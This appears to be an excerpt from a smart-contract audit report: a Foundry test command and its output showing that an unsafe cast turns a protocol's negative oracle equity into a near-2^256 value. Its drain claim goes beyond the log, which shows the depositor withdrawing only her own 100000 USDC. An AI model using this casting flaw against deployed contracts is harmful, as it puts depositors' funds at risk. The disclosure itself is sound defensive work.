After running the following Foundry test command `forge test --match-test testUnsafeCastingVulnerability -vvv` this is the output that confirms the vulnerability:

```

[PASS] testUnsafeCastingVulnerability() (gas: 210642)

  === Testing Unsafe Casting vulnerability ===
  Step 1: Normal operation with positive equity
  Oracle equity (positive): 1000000000000
  Protocol equity after cast: 1000000000000
  Cast result correct: true
  Alice deposited: 100000 USDC
  Alice shares: 100000000000
  
  Step 2: vulnerability, Oracle returns negative equity
  Oracle equity (negative): -1000000
  This represents protocol insolvency, losses exceed assets
  
  Step 3: Unsafe casting converts negative to huge positive
  Protocol equity after unsafe cast: 115792089237316195423570985008687907853269984665640564039457584007913128639936
  Expected: Should be 0 or handled as negative
  Actual: Huge positive number due to integer overflow
  Direct unsafe cast result: 115792089237316195423570985008687907853269984665640564039457584007913128639936
  This equals 2^256 + negativeEquity due to two's complement
  
  Step 4: critical impact, users can drain protocol
  Alice's shares: 100000000000
  Protocol equity is now: 115792089237316195423570985008687907853269984665640564039457584007913128639936
  Total shares: 100000000000
  With inflated equity, Alice can withdraw: 1157920892373161954235709850086879078532699846656405640394574 USDC
  Alice only deposited: 100000 USDC
  Excess withdrawal: 1157920892373161954235709850086879078532699846656405640294574 USDC
  
  Alice attempts withdrawal...
  Protocol USDC balance before: 100000 USDC
  Alice actually withdrew: 100000 USDC
  Alice originally deposited: 100000 USDC
  
  Vulnernability impact:
  - Unsafe casting turned negative equity into huge positive
  - Protocol accounting completely broken
  - Users can potentially drain more than they deposited
